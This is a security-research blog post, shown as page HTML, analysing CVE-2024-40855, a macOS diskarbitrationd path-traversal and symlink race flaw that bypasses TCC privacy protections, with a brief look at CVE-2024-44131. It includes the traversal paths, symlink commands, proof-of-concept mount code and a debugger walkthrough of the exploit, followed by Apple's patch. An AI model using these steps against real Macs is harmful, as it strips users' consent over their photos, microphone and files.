+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2025-01-19 17:00" pubdate>
+      2025년 1월 19일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.4k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      47
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Research] MacOS TCC Bypass (en)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/TCC_Bypass.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>Dreaming of becoming a future Apple picker, I&#x2019;m back with another macOS vulnerability&#x2014;this time, a TCC Bypass! &#x1F34F;</p>
+<p>&#x1F517; <strong>Related post:</strong> <a href="https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/">CVE-2024-44175 - macOS <code>diskarbitrationd</code> Sandbox Escape</a></p>
+<p>In my previous post, I covered a vulnerability in the <code>diskarbitrationd</code> system daemon that allowed attackers to bypass the sandbox or elevate privileges through filesystem manipulation.</p>
+<p>Today, we&#x2019;re diving into <strong>CVE-2024-40855</strong>, another flaw in <code>diskarbitrationd</code> that not only <strong>escapes the sandbox</strong> but also allows mounting into the user&#x2019;s <strong>Transparency, Consent, and Control (TCC)</strong> directory. This vulnerability exploits a <strong>Directory Traversal attack</strong> in <code>diskarbitrationd</code>.</p>
+<hr>
+<h1 id="1-TCC-Bypass"><a href="#1-TCC-Bypass" class="headerlink" title="1. TCC Bypass?"></a>1. TCC Bypass?</h1><p>Transparency, Consent, and Control (TCC) is <strong>Apple&#x2019;s security framework</strong> that governs app permissions for accessing <strong>sensitive user data</strong>. Users can manage these permissions via the <code>Settings</code> app.</p>
+<p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image1.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>Ever seen a popup asking, <em>&#x201C;Do you want to allow microphone access?&#x201D;</em>?</p>
+<p>That&#x2019;s TCC in action&#x2014;macOS&#x2019;s <strong>app permission management system</strong>.</p>
+<p>A <strong>TCC Bypass</strong> occurs when an attacker gains unauthorized access to sensitive user data (e.g., photos, microphone, location) <strong>without the user&#x2019;s consent</strong>.</p>
+<h1 id="2-Vulnerability-Overview"><a href="#2-Vulnerability-Overview" class="headerlink" title="2. Vulnerability Overview"></a>2. Vulnerability Overview</h1><h3 id="CVE-2024-40855"><a href="#CVE-2024-40855" class="headerlink" title="CVE-2024-40855"></a>CVE-2024-40855</h3><blockquote>
+<p>A directory traversal vulnerability in diskarbitrationd, a macOS system daemon, allows an attacker to bypass TCC protections by mounting unauthorized paths.</p>
+</blockquote>
+<h3 id="Version-Information"><a href="#Version-Information" class="headerlink" title="Version Information"></a><strong>Version Information</strong></h3><p>macOS : 13.0 &#x2264; 14.6</p>
+<h3 id="diskarbitrationd"><a href="#diskarbitrationd" class="headerlink" title="diskarbitrationd"></a><strong>diskarbitrationd</strong></h3><p>The <code>diskarbitrationd</code> daemon has three key characteristics:</p>
+<ul>
+<li>Runs <strong>as root</strong></li>
+<li>Accessible <strong>from within the sandbox</strong></li>
+<li>Has the <strong><code>com.apple.private.security.storage-exempt.heritable</code></strong> attribute, effectively granting it <strong>Full Disk Access</strong></li>
+</ul>
+<p>Because of these, Apple implements <strong>strict validation mechanisms</strong> to prevent sandbox escapes and unauthorized mounting to TCC-protected directories.</p>
+<p>Sandbox validation includes:</p>
+<ol>
+<li><strong>Mount Path Validation</strong><ul>
+<li>The client-side logic checks for <code>../</code> (directory traversal) and ensures <strong>path resolution</strong> does not bypass security checks (e.g., via symlink attacks).</li>
+</ul>
+</li>
+<li><strong>Sandbox Verification</strong><ul>
+<li><code>diskarbitrationd</code> calls <code>sandbox_check_by_audit_token</code> to determine if the requesting process has access to the specified files/directories.</li>
+</ul>
+</li>
+<li><strong>Kernel-Level Mount Validation</strong><ul>
+<li>The kernel enforces additional restrictions on external mount requests, rejecting any paths containing symbolic links when the <code>k</code> option is used.</li>
+</ul>
+</li>
+</ol>
+<p>These three layers of validation are supposed to prevent sandbox escapes and unauthorized TCC access.</p>
+<h3 id="&#x1F525;-Bypassing-Client-Side-Mount-Path-Validation"><a href="#&#x1F525;-Bypassing-Client-Side-Mount-Path-Validation" class="headerlink" title="&#x1F525; Bypassing Client-Side Mount Path Validation"></a>&#x1F525; Bypassing Client-Side Mount Path Validation</h3><p>The flaw lies in the <strong>first step</strong>&#x2014;Mount Path Validation.</p>
+<p>This check happens <strong>on the client-side</strong> within Apple&#x2019;s <code>DiskArbitration</code> framework, specifically in the function <code>DADiskMountWithArgumentsCommon</code>. An attacker can <strong>completely bypass this validation</strong> by skipping <code>DiskArbitration</code> and calling <code>diskarbitrationd</code> <strong>directly</strong>.</p>
+<p>By doing this, the attacker can:</p>
+<p>&#x2705; <strong>Pass a mount path containing <code>../</code> elements</strong></p>
+<p>&#x2705; <strong>Bypass sandbox checks</strong></p>
+<p>&#x2705; <strong>Bypass symlink restrictions</strong></p>
+<p>Here&#x2019;s the relevant part of the <code>DADiskMountWithArgumentsCommon</code> function:</p>
+<pre><code class="hljs c"><span class="hljs-function">__private_extern__ <span class="hljs-keyword">void</span> <span class="hljs-title">DADiskMountWithArgumentsCommon</span><span class="hljs-params">( DADiskRef disk,</span></span>
+<span class="hljs-function"><span class="hljs-params">                               CFURLRef            path,</span></span>
+<span class="hljs-function"><span class="hljs-params">                               DADiskMountOptions  options,</span></span>
+<span class="hljs-function"><span class="hljs-params">                               DADiskMountCallback callback,</span></span>
+<span class="hljs-function"><span class="hljs-params">                               <span class="hljs-keyword">void</span> *              context,</span></span>
+<span class="hljs-function"><span class="hljs-params">                               CFStringRef         arguments[],</span></span>
+<span class="hljs-function"><span class="hljs-params">                               <span class="hljs-keyword">bool</span>                block )</span></span>
+<span class="hljs-function"></span>{
+...
+    <span class="hljs-keyword">if</span> ( path )
+    {
+        <span class="hljs-keyword">char</span> * _path;
+        _path = ___CFURLCopyFileSystemRepresentation( path );
+        <span class="hljs-keyword">if</span> ( _path )
+        {
+            <span class="hljs-keyword">char</span> name[MAXPATHLEN];
+            <span class="hljs-keyword">if</span> ( realpath( _path, name ) )
+            {
+                path = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( <span class="hljs-keyword">void</span> * ) name, <span class="hljs-built_in">strlen</span>( name ), TRUE );
+            }
+            <span class="hljs-keyword">else</span>
+            {
+                CFRetain( path );
+            }
+            <span class="hljs-built_in">free</span>( _path );
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            CFRetain( path );
+        }
+    }
+    status = kDAReturnBadArgument;
+    <span class="hljs-keyword">if</span> ( disk )
+    {
+        status = _DAAuthorize( _DADiskGetSession( disk ), _kDAAuthorizeOptionIsOwner, disk, _kDAAuthorizeRightMount );
+        <span class="hljs-keyword">if</span> ( status == kDAReturnSuccess )
+        {
+            status = __DAQueueRequest( _DADiskGetSession( disk ), _kDADiskMount, disk, options, path ? CFURLGetString( path ) : <span class="hljs-literal">NULL</span>, argument, callback, context, block );
+        }
+    }
+...
+}
+</code></pre>
+<p>In the code above, the <code>realpath</code> and <code>CFURLCreateFromFileSystemRepresentation</code> function calls are responsible for stripping <code>../</code> elements. However, since this validation occurs on the client side, an attacker can completely bypass it by calling <code>diskarbitrationd</code> directly. By skipping the <code>DiskArbitration</code> framework and passing a path containing <code>../</code> elements directly to <code>diskarbitrationd</code>, it becomes possible to evade sandbox restrictions and mount a TCC-protected directory.</p>
+<p>These functions sanitize paths <strong>only on the client side</strong>. If an attacker <strong>calls <code>diskarbitrationd</code> directly</strong>, they can inject a <code>../</code> traversal attack <strong>before validation occurs</strong>.</p>
+<h3 id="Explain-1-Mounting-Library-Application-Support-com-apple-TCC"><a href="#Explain-1-Mounting-Library-Application-Support-com-apple-TCC" class="headerlink" title="Explain 1 : Mounting ~/Library/Application Support/com.apple.TCC"></a>Explain 1 : Mounting <code>~/Library/Application Support/com.apple.TCC</code></h3><p>Let&#x2019;s walk through how to exploit this vulnerability to mount the user&#x2019;s <strong>TCC directory</strong> and modify <code>TCC.db</code>.</p>
+<p><strong>Step 1: Call <code>DAMount</code> with a Traversal Path</strong></p>
+<pre><code class="hljs bash">/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC</code></pre>
+<p>We provide a crafted path with <code>../</code> elements.</p>
+<p>&#x26A0;&#xFE0F; <strong>Key Trick:</strong> Ensure the client does not interpret the path before it reaches <code>diskarbitrationd</code>.</p>
+<p><strong>Step 2: Manipulate Symlinks During <code>sandbox_check_by_audit_token</code> Execution</strong></p>
+<p>1&#xFE0F;&#x20E3; Create a symbolic link</p>
+<pre><code class="hljs bash">/private/tmp/starthere -&gt; /private/tmp/1/2/3</code></pre>
+<p>2&#xFE0F;&#x20E3; When <code>sandbox_check_by_audit_token</code> checks the path, the following <strong>unexpected transformation</strong> occurs:</p>
+<pre><code class="hljs bash">/private/tmp/Users/crab/Library/Application Support/com.apple.TCC</code></pre>
+<p>3&#xFE0F;&#x20E3; Next, create a directory structure that <strong>mimics</strong> the expected validation path:</p>
+<pre><code class="hljs bash">/private/tmp/1/2/3/../../../Users/crab/Library/Application Support/com.apple.TCC
+/private/tmp/Users/crab/Library/Application Support/com.apple.TCC</code></pre>
+<p>As a result, this path is allowed to be mounted inside <code>/private/tmp/</code>, enabling it to pass security checks.</p>
+<p><strong>3. Remove the Symbolic Link and Execute the Mount</strong></p>
+<pre><code class="hljs bash">/private/tmp/**starthere**/../../../Users/crab/Library/Application Support/com.apple.TCC</code></pre>
+<p>Once the <code>sandbox_check_by_audit_token</code> check is complete, delete the symbolic link and replace it with an empty directory. After that, <code>diskarbitrationd</code> will execute the external mount command again, using the same path as before.</p>
+<pre><code class="hljs bash">/Users/crab/Library/Application Support/com.apple.TCC</code></pre>
+<p>However, this time, <code>starthere</code> is a <strong>directory</strong> instead of a <strong>symbolic link</strong>, meaning the final transformation remains the same as before.</p>
+<p>Since the path no longer contains a symbolic link, the <strong>kernel will process it as a regular path</strong>. Moreover, because the calling process is <code>diskarbitrationd</code>, which possesses the <code>com.apple.private.security.storage-exempt.heritable</code> privilege, it is able to <strong>bypass the kernel&#x2019;s Mandatory Access Control Framework (MACF) Sandbox checks</strong>. As a result, this method works even within the sandbox.</p>
+<p><strong>4. TCC Bypass and Sandbox Escape</strong></p>
+<p>By following <strong>steps 1&#x2013;3</strong>, you can successfully perform a <strong>TCC Bypass</strong>.</p>
+<p>To further <strong>escape the sandbox</strong>, you can <strong>mount the <code>~/Library/Preferences</code> directory</strong> using a similar technique. By doing so, you can place a custom Terminal preference file that <strong>automatically executes specific commands</strong> when Terminal is opened.</p>
+<p>In essence, this vulnerability is a <strong>Time of Check to Time of Use (TOCTOU) bug</strong>, functioning similarly to the vulnerability described in <a href="https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/">a previous post</a>.</p>
+<hr>
+<h3 id="Explain-2"><a href="#Explain-2" class="headerlink" title="Explain 2"></a>Explain 2</h3><p>Let&#x2019;s replicate <strong>Explain 1</strong> using a debugger.</p>
+<pre><code class="hljs c"><span class="hljs-meta">#import <span class="hljs-meta-string">&lt;DiskArbitration/DiskArbitration.h&gt;</span></span>
+<span class="hljs-meta">#import <span class="hljs-meta-string">&lt;Foundation/Foundation.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{
+    DASessionRef session = DASessionCreate(kCFAllocatorDefault);
+    DADiskRef disk = DADiskCreateFromBSDName(kCFAllocatorDefault, session, <span class="hljs-string">&quot;/dev/disk6s1&quot;</span>);
+    CFDictionaryRef properties;
+    CFURLRef diskurl = (__bridge CFURLRef)[NSURL fileURLWithPath:@<span class="hljs-string">&quot;/dev/disk6s1&quot;</span>];
+    CFURLRef url = (__bridge CFURLRef)[NSURL fileURLWithPath:@<span class="hljs-string">&quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&quot;</span>];
+    DADiskMount(disk, url, kDADiskMountOptionDefault, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<p>The code above attempts to mount a disk at the path:</p>
+<p><code>/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC</code>.</p>
+<p>Compile the code, start debugging using <code>lldb</code>, and set the following breakpoints:</p>
+<pre><code class="hljs bash">(lldb) breakpoint list
+Current breakpoints:
+1: name = <span class="hljs-string">&apos;realpath&apos;</span>, locations = 1, resolved = 1, hit count = 0
+  1.1: <span class="hljs-built_in">where</span> = libsystem_c.dylib`realpath, address = 0x00000001921de874, resolved, hit count = 0 
+2: name = <span class="hljs-string">&apos;DADiskMountWithArgumentsCommon&apos;</span>, locations = 1, resolved = 1, hit count = 1
+  2.1: <span class="hljs-built_in">where</span> = DiskArbitration`DADiskMountWithArgumentsCommon, address = 0x000000019a1bdb48, resolved, hit count = 1 
+3: address = DiskArbitration[0x0000000188325c1c], locations = 1, resolved = 1, hit count = 1
+  3.1: <span class="hljs-built_in">where</span> = DiskArbitration`DADiskMountWithArgumentsCommon + 212, address = 0x000000019a1bdc1c, resolved, hit count = 1 
+4: name = <span class="hljs-string">&apos;__DAQueueRequest&apos;</span>, locations = 1, resolved = 1, hit count = 1
+  4.1: <span class="hljs-built_in">where</span> = DiskArbitration`__DAQueueRequest, address = 0x000000019a1bcde0, resolved, hit count = 1</code></pre>
+<p>Attach <code>lldb</code> to the <code>diskarbitrationd</code> process and set a breakpoint for <code>sandbox_check_by_audit_token</code>:</p>
+<pre><code class="hljs routeros">(lldb) breakpoint list
+Current breakpoints:
+2: name = <span class="hljs-string">&apos;sandbox_check_by_audit_token&apos;</span>, locations = 1, resolved = 1, hit count = 4
+  2.1: where = libsystem_sandbox.dylib`sandbox_check_by_audit_token,<span class="hljs-built_in"> address </span>= 0x000000019d5a61cc, resolved, hit count = 4</code></pre>
+<p>Prepare the required <strong>symbolic links and directories</strong>:</p>
+<pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/private/</span>tmp<span class="hljs-regexp">/deep/</span><span class="hljs-number">1</span><span class="hljs-regexp">/2 /</span><span class="hljs-keyword">private</span><span class="hljs-regexp">/tmp/</span>starthere
+mkdir -p <span class="hljs-string">&quot;/private/tmp/Users/crab/Library/Application Support/com.apple.TCC/&quot;</span></code></pre>
+<hr>
+<p><strong>Debugging with LLDB After Execution</strong></p>
+<ol>
+<li>Run the program and reach a breakpoint</li>
+</ol>
+<pre><code class="hljs routeros">(lldb) run
+Process 1591 launched: <span class="hljs-string">&apos;/Users/crab/m&apos;</span> (arm64)
+Process 1591 stopped
+* thread #1,<span class="hljs-built_in"> queue </span>= <span class="hljs-string">&apos;com.apple.main-thread&apos;</span>, stop reason = breakpoint 2.1</code></pre>
+<ol>
+<li>Perform a memory dump on the address pointed to by the <code>X1</code> register</li>
+</ol>
+<pre><code class="hljs angelscript">(lldb) memory read -f p $x1
+<span class="hljs-number">0x600000024060</span>: <span class="hljs-number">0x01000001fa131911</span> <span class="hljs-number">0x0001cc4fc6001d80</span> <span class="hljs-number">0x0800010060015821</span> <span class="hljs-number">0x0000600000f24000</span></code></pre>
+<ol>
+<li>Verify the path string</li>
+</ol>
+<pre><code class="hljs angelscript">(lldb) memory read -f s <span class="hljs-number">0x0000600000f24000</span>+<span class="hljs-number">16</span>
+<span class="hljs-number">0x600000f24010</span>: <span class="hljs-string">&quot;^file:///private/tmp/starthere/../../../Users/crab/Library/Application%20Support/com.apple.TCC/&quot;</span></code></pre>
+<ol>
+<li>Stop at the <code>__DAQueueRequest</code> breakpoint and check the value of the <code>X4</code> register</li>
+</ol>
+<pre><code class="hljs arduino">(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">read</span> $x4
+      x4 = <span class="hljs-number">0x0000600000020000</span></code></pre>
+<ol>
+<li>Verify the path string</li>
+</ol>
+<pre><code class="hljs perl">(lldb) memory <span class="hljs-keyword">read</span> -f <span class="hljs-keyword">s</span> $x4+<span class="hljs-number">16</span>
+<span class="hljs-number">0x600000020010</span>: <span class="hljs-string">&quot;Kfile:///private/tmp/Users/crab/Library/Application%20Support/com.apple.TCC/&quot;</span></code></pre>
+<ol>
+<li>Overwrite the <code>X4</code> register with the original path value</li>
+</ol>
+<pre><code class="hljs arduino">(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">write</span> $x4 <span class="hljs-number">0x0000600000f24000</span>
+(lldb) c
+<span class="hljs-built_in">Process</span> <span class="hljs-number">1606</span> resuming</code></pre>
+<hr>
+<ol>
+<li>The <code>diskarbitrationd</code> process stops at the <code>sandbox_check_by_audit_token</code> breakpoint.</li>
+</ol>
+<pre><code class="hljs routeros">(lldb) c
+Process 113 resuming
+Process 113 stopped
+* thread #2,<span class="hljs-built_in"> queue </span>= <span class="hljs-string">&apos;DAServer&apos;</span>, stop reason = breakpoint 2.1</code></pre>
+<ol>
+<li>Verify that the path remains unchanged via memory dump</li>
+</ol>
+<pre><code class="hljs stata">(lldb) <span class="hljs-keyword">memory</span> <span class="hljs-keyword">read</span> -f s 0x000000014ea0cc90
+0x14ea0cc90: <span class="hljs-string">&quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&quot;</span></code></pre>
+<ol>
+<li>Check the return value after calling <code>sandbox_check_by_audit_token</code>.</li>
+</ol>
+<pre><code class="hljs arduino">(lldb) finish
+(lldb) <span class="hljs-keyword">register</span> <span class="hljs-built_in">read</span> $x0
+      x0 = <span class="hljs-number">0x0000000000000000</span></code></pre>
+<p>Since <code>sandbox_check_by_audit_token</code> returns <code>0</code>, the check is passed.</p>
+<ol>
+<li>Replace <code>starthere</code> with a directory, run <code>diskarbitrationd</code>, and verify the mount result</li>
+</ol>
+<pre><code class="hljs awk">crab@see /tmp % rm starthere
+crab@see /tmp % mkdir starthere
+
+(lldb) c
+
+crab@see /tmp % mount
+...
+<span class="hljs-regexp">/dev/</span>disk6s1 on <span class="hljs-regexp">/Users/</span>crab<span class="hljs-regexp">/Library/</span>Application Support/com.apple.TCC (apfs, local, nodev, nosuid, journaled, noowners, mounted by crab)</code></pre>
+<h2 id="Patch-Notes"><a href="#Patch-Notes" class="headerlink" title="Patch Notes"></a>Patch Notes</h2><p>Apple has fixed this vulnerability in macOS Sequoia 15.0.</p>
+<pre><code class="hljs c"><span class="hljs-keyword">if</span> ( mntpath )
+{
+    <span class="hljs-keyword">if</span> ( ( _argument1 &amp; kDADiskMountOptionNoFollow ) == <span class="hljs-number">0</span> )
+    {
+        <span class="hljs-keyword">if</span> ( realpath( mntpath, path ) )
+        {
+            CFTypeRef mountpath = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( <span class="hljs-keyword">void</span> * ) path, <span class="hljs-built_in">strlen</span>( path ), TRUE );
+            <span class="hljs-keyword">if</span> ( mountpath )
+            {
+                DARequestSetArgument2( request, CFURLGetString( mountpath ) );
+                CFRelease ( mountpath );
+            }
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            status = kDAReturnBadArgument;
+        }
+    }
+}</code></pre>
+<p>They now perform path resolution within <code>diskarbitrationd</code> when handling requests instead of relying on the client side. This prevents attackers from injecting paths containing <code>../</code> elements while maintaining the expected behavior for legitimate callers.</p>
+<p>However, this validation logic is only applied if the <code>kDADiskMountOptionNoFollow</code> flag is <strong>not</strong> provided. If an attacker explicitly sets <code>kDADiskMountOptionNoFollow</code>, the original attack would still be possible.</p>
+<p>To fully mitigate this, Apple made an additional change to <code>sandbox_check_by_audit_token</code>:</p>
+<pre><code class="hljs c">status = sandbox_check_by_audit_token(_token, <span class="hljs-string">&quot;file-mount&quot;</span>, SANDBOX_FILTER_PATH | SANDBOX_CHECK_ALLOW_APPROVAL | SANDBOX_CHECK_CANONICAL, path);</code></pre>
+<p>The <code>SANDBOX_CHECK_CANONICAL</code> option was added to the validation process. With this, the sandbox check now <strong>automatically fails</strong> if the path contains symbolic links or directory traversal elements (<code>../</code>). This allows the system to block the attack at an earlier stage.</p>
+<h1 id="3-Other-Types-of-TCC-Bypass-Vulnerabilities"><a href="#3-Other-Types-of-TCC-Bypass-Vulnerabilities" class="headerlink" title="3. Other Types of TCC Bypass Vulnerabilities"></a>3. Other Types of TCC Bypass Vulnerabilities</h1><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image2.png" srcset="/img/loading.gif" alt="image.png"></p>
+<h3 id="CVE-2024-44131"><a href="#CVE-2024-44131" class="headerlink" title="CVE-2024-44131"></a>CVE-2024-44131</h3><blockquote>
+<p>This is a TCC bypass vulnerability in File Provider, an extension that allows users to access files and folders synchronized with remote storage (such as iCloud) on macOS and iOS. The vulnerability arises due to a symlink validation flaw when the Files app and the fileproviderd system process handle file operations.</p>
+</blockquote>
+<h3 id="Version-Information-1"><a href="#Version-Information-1" class="headerlink" title="Version Information"></a><strong>Version Information</strong></h3><p>macOS : 5.3 &#x2264; 14.7</p>
+<h3 id="File-Provider"><a href="#File-Provider" class="headerlink" title="File Provider?"></a>File Provider?</h3><p>A <strong>File Provider</strong> is an extension that allows other apps to access files and folders synchronized with remote storage.</p>
+<p>macOS and iOS use the <strong>Transparency, Consent, and Control (TCC)</strong> mechanism to notify users when an application attempts to access sensitive information&#x2014;such as <strong>photos, GPS location, contacts, etc.</strong>&#x2014;and allows them to approve or deny the request.</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.apple.com/documentation/fileprovider">Apple Documentation on File Provider</a></p>
+<p>The vulnerability exploits a <strong>symlink attack</strong> targeting the <strong>Files app</strong> and the <strong><code>fileproviderd</code> system process</strong>.</p>
+<h3 id="Key-Components-Involved-in-the-Attack"><a href="#Key-Components-Involved-in-the-Attack" class="headerlink" title="Key Components Involved in the Attack"></a><strong>Key Components Involved in the Attack</strong></h3><p>&#x1F4C1; <strong>Files.app</strong></p>
+<p>The default file explorer on iOS and macOS. It allows users to browse and manage files in iCloud Drive, local storage, external storage devices, and third-party cloud services (e.g., Google Drive, Dropbox).</p>
+<p>&#x2699;&#xFE0F; <strong>fileproviderd</strong></p>
+<p>A system process in macOS and iOS that manages the <strong>File Provider</strong> extension. It plays a crucial role in handling file synchronization and access between the Files app and cloud storage.</p>
+<h3 id="How-the-Attack-Works"><a href="#How-the-Attack-Works" class="headerlink" title="How the Attack Works"></a><strong>How the Attack Works</strong></h3><p>When a user moves or copies a file using <strong>Files.app</strong>, a malicious app running in the background can intercept and manipulate the operation. The attacker <strong>exploits the high privileges of <code>fileproviderd</code></strong> to interfere with file operations <strong>without triggering a TCC prompt (permission request window).</strong></p>
+<p>Typically, mitigation techniques prevent attackers from exploiting <strong>symlink race conditions</strong> or <strong>path traversal attacks</strong> when privileged processes copy, move, or delete files. Most file operation APIs include checks to <strong>verify whether the source or destination is a symlink</strong> and are designed to abort the operation if a symlink is detected.</p>
+<p>However, in this vulnerability, attackers <strong>bypass the existing checks</strong> by inserting a symlink <strong>one directory level above</strong> the target file <strong>midway through the operation</strong>, instead of placing a symlink directly at the final file path <strong>before</strong> the operation starts.</p>
+<h3 id="Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques"><a href="#Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques" class="headerlink" title="Comparison of Traditional vs. New Symlink Attack Techniques"></a><strong>Comparison of Traditional vs. New Symlink Attack Techniques</strong></h3><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image3.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p><strong>Traditional Symlink Attack</strong></p>
+<ul>
+<li>Attackers place a <strong>symlink at the final file or directory level</strong>.</li>
+<li>Security validation detects the symlink and blocks the attack.</li>
+</ul>
+<p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image4.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p><strong>CVE-2024-44131 Symlink Attack</strong></p>
+<ul>
+<li>Attackers insert a <strong>symlink at the parent directory level</strong> <em>after</em> the file copy has started.</li>
+<li>Since <strong>previous checks only validated the final file/directory name</strong>, this approach <strong>bypasses the security check</strong> by altering the path mid-operation.</li>
+<li>As a result, attackers can <strong>hijack files without triggering a TCC prompt</strong> or <strong>copy files that require special privileges</strong>.</li>
+</ul>
+<h3 id="Paths-Accessible-by-fileproviderd"><a href="#Paths-Accessible-by-fileproviderd" class="headerlink" title="Paths Accessible by fileproviderd"></a><strong>Paths Accessible by <code>fileproviderd</code></strong></h3><p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image5.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>&#x1F4CD; <strong>Key Target Path</strong> <code>/var/mobile/Library/Application Support/FileProvider/AccessControl.db</code> This database stores a list of apps that have interacted with the Files app and the file system. Attackers can potentially exploit it for unauthorized access.</p>
+<p><img src="/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image6.png" srcset="/img/loading.gif" alt="image.png"></p>
